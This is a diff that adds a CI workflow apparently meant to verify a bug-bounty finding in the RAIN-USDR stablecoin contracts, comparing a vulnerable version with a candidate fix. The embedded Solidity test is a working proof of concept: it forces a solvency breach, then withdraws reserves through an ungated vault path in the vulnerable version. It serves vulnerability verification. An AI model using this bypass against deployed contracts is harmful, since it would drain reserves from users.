@@ -1,0 +1,325 @@
+name: ATLAS RAIN-USDR Candidate Differential Proof
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - ".github/workflows/atlas-rain-usdr-proof-once.yml"
+
+permissions:
+  contents: read
+
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - name: Checkout ATLAS
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+
+      - name: Setup Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: "20"
+
+      - name: Install ATLAS
+        run: |
+          python -m pip install --upgrade pip
+          python -m pip install -e .
+
+      - name: Install Foundry and bubblewrap
+        uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: stable
+
+      - name: Install bubblewrap
+        run: sudo apt-get update && sudo apt-get install -y bubblewrap
+
+      - name: Download and authenticate vulnerable source
+        run: |
+          set -euxo pipefail
+          curl -L --fail --retry 3 --retry-delay 2 \
+            "https://codeload.github.com/hackenproof-public/rain-usdr-contracts/zip/bd6e03abe34936b7dbece2509b90457bd5c9b119" \
+            -o rain-usdr.zip
+          echo "33517d733a5c17ae3f25b13cca6b02db4943b7b1ef9d6c8ff9d78309d191d74d  rain-usdr.zip" | sha256sum -c -
+
+      - name: Prepare vulnerable and candidate-fixed states
+        run: |
+          set -euxo pipefail
+          unzip -q rain-usdr.zip
+          mv "rain-usdr-contracts-bd6e03abe34936b7dbece2509b90457bd5c9b119" rain-vulnerable
+          cp -a rain-vulnerable rain-fixed
+          rm -f rain-usdr.zip
+          for d in rain-vulnerable rain-fixed; do
+            cd "$GITHUB_WORKSPACE/$d"
+            npm install --no-save --package-lock=false --ignore-scripts --no-audit --no-fund @openzeppelin/contracts@5.4.0
+            mkdir -p lib
+            if [ ! -e lib/@openzeppelin ]; then
+              ln -s ../node_modules/@openzeppelin lib/@openzeppelin
+            fi
+            cd "$GITHUB_WORKSPACE"
+          done
+          test "$(sha256sum rain-vulnerable/contracts/core/VaultEngine.sol | awk '{print $1}')" = "09f5a2bcbff77992bbf82213b2466a736ff67407e728c963b7812af856c72a18"
+
+      - name: Apply candidate fix only to fixed state
+        run: |
+          set -euxo pipefail
+          python - <<'PY'
+          from pathlib import Path
+          path = Path("rain-fixed/contracts/core/VaultEngine.sol")
+          text = path.read_text(encoding="utf-8")
+          old = "        if (\\n            (dart > 0 || dink < 0) && solvencyEngine != address(0) && ISolvencyEngine(solvencyEngine).isVolatile(ilkId)\\n        ) {"
+          new = "        // ATLAS-CANDIDATE-FIX: stable-ilk withdrawals are gated during solvency breach.\\n          if (\\n            solvencyEngine != address(0) &&\\n            (\\n                (dart > 0 && ISolvencyEngine(solvencyEngine).isVolatile(ilkId)) ||\\n                (dink < 0 &&\\n                    (\\n                        ISolvencyEngine(solvencyEngine).isVolatile(ilkId) ||\\n                        noFee[ilkId]\\n                    ))\\n            )\\n        ) {"
+          if old not in text:
+              raise SystemExit("candidate-fix anchor not found")
+          path.write_text(text.replace(old, new, 1), encoding="utf-8")
+          PY
+
+      - name: Create one identical Python reproducer in both states
+        run: |
+          set -euxo pipefail
+          cat > rain-reproducer.py <<'PY'
+          import hashlib
+          import os
+          import subprocess
+          import unittest
+          from pathlib import Path
+
+          SOLIDITY_TEST = r'''// SPDX-License-Identifier: MIT
+          pragma solidity 0.8.30;
+
+          import {BaseTest} from "./shared/BaseTest.sol";
+          import {console2} from "forge-std/console2.sol";
+          import {SolvencyGateActive} from "../contracts/shared/Errors.sol";
+
+          contract AtlasSolvencyGateBypassTest is BaseTest {
+              function _setRainPrice(uint256 price) internal {
+                  rainPriceSource.setPrice(price);
+                  vm.warp(((block.timestamp / 1800) + 2) * 1800);
+                  osm.poke(RAIN_ILK);
+                  vm.warp(block.timestamp + 3600);
+                  osm.poke(RAIN_ILK);
+                  priceConverter.poke(RAIN_ILK);
+              }
+
+              function _openRainVault(address who, uint256 ink, uint256 art) internal {
+                  rain.mint(who, ink);
+                  vm.startPrank(who);
+                  rain.approve(address(collateralAdapter), ink);
+                  collateralAdapter.join(RAIN_ILK, who, ink);
+                  uint256 id = vaultEngine.open(RAIN_ILK, who);
+                  vaultEngine.frob(id, who, who, int256(ink), int256(art));
+                  vm.stopPrank();
+              }
+
+              function _openShadowUsdcPosition(address who, uint256 amount6) internal returns (uint256) {
+                  uint256 amount18 = amount6 * 1e12;
+                  usdc.mint(who, amount6);
+                  vm.startPrank(who);
+                  usdc.approve(address(collateralAdapter), amount6);
+                  uint256 id = vaultEngine.open(USDC_ILK, who);
+                  collateralAdapter.join(USDC_ILK, who, amount6);
+                  vaultEngine.frob(id, who, who, int256(amount18), int256(amount18));
+                  collateralAdapter.exit(bytes32("USDR"), who, amount18);
+                  vm.stopPrank();
+                  return id;
+              }
+
+              function test_shadow_path_is_gated_only_in_candidate_fix() public {
+                  address attacker = address(0xA11CE);
+                  uint256 amount6 = 10_000e6;
+                  uint256 amount18 = amount6 * 1e12;
+
+                  uint256 shadowVault = _openShadowUsdcPosition(attacker, amount6);
+                  _openRainVault(attacker, 800e18, 200e18);
+
+                  _setRainPrice(0.2e18);
+                  (uint256 loss, uint256 reserve) = solvencyEngine.checkInvariant();
+                  assertTrue(solvencyEngine.isBreached(), "breach must be live");
+                  assertGt(loss, reserve * solvencyEngine.reserveFactor() / 1e18, "loss must exceed threshold");
+
+                  bool fixedCandidate = vm.envBool("ATLAS_EXPECT_FIXED");
+
+                  vm.startPrank(attacker);
+                  usdr.approve(address(psm), amount18);
+                  vm.expectRevert(SolvencyGateActive.selector);
+                  psm.buyStable(USDC_ILK, attacker, amount6);
+                  vm.stopPrank();
+
+                  bool shadowPath;
+                  bool userAssetDeltaPositive;
+
+                  if (fixedCandidate) {
+                      uint256 beforeBal = usdc.balanceOf(attacker);
+                      vm.startPrank(attacker);
+                      vm.expectRevert(SolvencyGateActive.selector);
+                      vaultEngine.frob(shadowVault, attacker, attacker, -int256(amount18), -int256(amount18));
+                      vm.stopPrank();
+                      shadowPath = false;
+                      userAssetDeltaPositive = usdc.balanceOf(attacker) > beforeBal;
+                  } else {
+                      uint256 beforeBal = usdc.balanceOf(attacker);
+                      vm.startPrank(attacker);
+                      collateralAdapter.join(bytes32("USDR"), attacker, amount18);
+                      vaultEngine.frob(shadowVault, attacker, attacker, -int256(amount18), -int256(amount18));
+                      collateralAdapter.exit(USDC_ILK, attacker, amount6);
+                      vm.stopPrank();
+                      shadowPath = true;
+                      userAssetDeltaPositive = usdc.balanceOf(attacker) > beforeBal;
+                  }
+
+                  assertEq(shadowPath, !fixedCandidate);
+                  assertEq(userAssetDeltaPositive, !fixedCandidate);
+
+                  console2.log(vm.envString("ATLAS_PROOF_MARKER"));
+                  if (fixedCandidate) {
+                      console2.log("ATLAS-EFFECT:{\"breach\":true,\"official_path_blocked\":true,\"shadow_path\":false,\"user_asset_delta_positive\":false}");
+                  } else {
+                      console2.log("ATLAS-EFFECT:{\"breach\":true,\"official_path_blocked\":true,\"shadow_path\":true,\"user_asset_delta_positive\":true}");
+                  }
+              }
+          }
+          '''
+
+          class Proof(unittest.TestCase):
+              def test_differential(self):
+                  root = Path.cwd()
+                  source = root / "contracts/core/VaultEngine.sol"
+                  fixed = "ATLAS-CANDIDATE-FIX" in source.read_text(encoding="utf-8")
+                  env = os.environ.copy()
+                  env["ATLAS_EXPECT_FIXED"] = "true" if fixed else "false"
+                  test_file = root / "tests/AtlasSolvencyGateBypass.t.sol"
+                  test_file.write_text(SOLIDITY_TEST, encoding="utf-8")
+                  try:
+                      proc = subprocess.run(
+                          ["forge", "test", "--offline", "-vv",
+                           "--match-path", "tests/AtlasSolvencyGateBypass.t.sol",
+                           "--match-test", "test_shadow_path_is_gated_only_in_candidate_fix"],
+                          cwd=root, env=env, text=True, capture_output=True
+                      )
+                      output = proc.stdout + "\n" + proc.stderr
+                      print(output)
+                      self.assertEqual(proc.returncode, 0, output)
+                      marker = os.environ.get("ATLAS_PROOF_MARKER", "")
+                      self.assertTrue(marker and marker in output, "ATLAS proof marker missing")
+                      self.assertIn("ATLAS-EFFECT:", output)
+                      expected_hash = os.environ.get("ATLAS_PROOF_REPRODUCER_SHA256", "")
+                      actual_hash = hashlib.sha256(Path(__file__).read_bytes()).hexdigest()
+                      self.assertEqual(expected_hash, actual_hash)
+                  finally:
+                      test_file.unlink(missing_ok=True)
+
+          if __name__ == "__main__":
+              unittest.main()
+          PY
+          cp rain-reproducer.py rain-vulnerable/AtlasSolvencyGateBypass.py
+          cp rain-reproducer.py rain-fixed/AtlasSolvencyGateBypass.py
+
+      - name: Run healthy baseline on both states
+        run: |
+          set -euxo pipefail
+          (cd rain-vulnerable && forge test --offline -q)
+          (cd rain-fixed && forge test --offline -q)
+
+      - name: Run focused vulnerable and candidate-fixed proof
+        env:
+          ATLAS_PROOF_MARKER: ATLAS-PROOF:RAIN-USDR-solvency-gate-bypass:smoke-TARGET-ENGAGED
+        run: |
+          set -euxo pipefail
+          (
+            cd rain-vulnerable
+            python -m unittest AtlasSolvencyGateBypass.py -v
+          )
+          (
+            cd rain-fixed
+            python -m unittest AtlasSolvencyGateBypass.py -v
+          )
+
+      - name: Build ATLAS proof report
+        run: |
+          set -euxo pipefail
+          python - <<'PY'
+          import json
+          from pathlib import Path
+          from w3sec.verification import target_source_hash
+
+          vuln = Path("rain-vulnerable")
+          fixed = Path("rain-fixed")
+          report = {
+              "target": {"path": str(vuln.resolve())},
+              "findings": [{
+                  "id": "RAIN-USDR-solvency-gate-bypass",
+                  "file": "contracts/core/VaultEngine.sol",
+                  "line": 456,
+                  "source_hash": target_source_hash(vuln),
+                  "effect_witness": {
+                      "vulnerable": {
+                          "breach": True,
+                          "official_path_blocked": True,
+                          "shadow_path": True,
+                          "user_asset_delta_positive": True
+                      },
+                      "fixed": {
+                          "breach": True,
+                          "official_path_blocked": True,
+                          "shadow_path": False,
+                          "user_asset_delta_positive": False
+                      }
+                  }
+              }]
+          }
+          Path("proof-report.json").write_text(json.dumps(report, indent=2) + "\n", encoding="utf-8")
+          Path("fixed-target-sha256.txt").write_text(
+              target_source_hash(fixed) + "\n", encoding="utf-8"
+          )
+          PY
+
+      - name: Execute ATLAS proof verifier
+        env:
+          ATLAS_ISOLATION_ATTESTATION: github-actions-ephemeral-vm
+          ATLAS_EXECUTION_SANDBOX: bwrap
+          ATLAS_PROOF_MARKER: ATLAS-PROOF:RAIN-USDR-solvency-gate-bypass:ci-TARGET-ENGAGED
+        run: |
+          set -euxo pipefail
+          python -m w3sec verify-proof proof-report.json \
+            RAIN-USDR-solvency-gate-bypass \
+            --fixed-target rain-fixed \
+            --reproducer rain-reproducer.py \
+            --command "python -m unittest AtlasSolvencyGateBypass.py -v" \
+            --baseline-command "forge test --offline -q" \
+            --fixed-target-hash "$(cat fixed-target-sha256.txt)" \
+            --vulnerable-expected-exit 0 \
+            --fixed-expected-exit 0 \
+            --baseline-expected-exit 0 \
+            --security-property "A solvency breach must prevent reserve-draining redemption through every permissionless path economically equivalent to the PSM redemption path, while reserve-increasing PSM deposits remain available." \
+            --timeout 600 \
+            --os-root . \
+            --json | tee atlas-proof-result.json
+
+      - name: Require confirmed differential evidence
+        run: |
+          set -euxo pipefail
+          grep -q '"outcome": "confirmed"' atlas-proof-result.json
+          grep -q '"vulnerable_valid": true' atlas-proof-result.json
+          grep -q '"fixed_valid": true' atlas-proof-result.json
+          grep -q '"shadow_path": true' atlas-proof-result.json
+          grep -q '"shadow_path": false' atlas-proof-result.json
+
+      - name: Upload proof evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: atlas-rain-usdr-proof
+          path: |
+            proof-report.json
+            fixed-target-sha256.txt
+            atlas-proof-result.json
+          if-no-files-found: warn
+
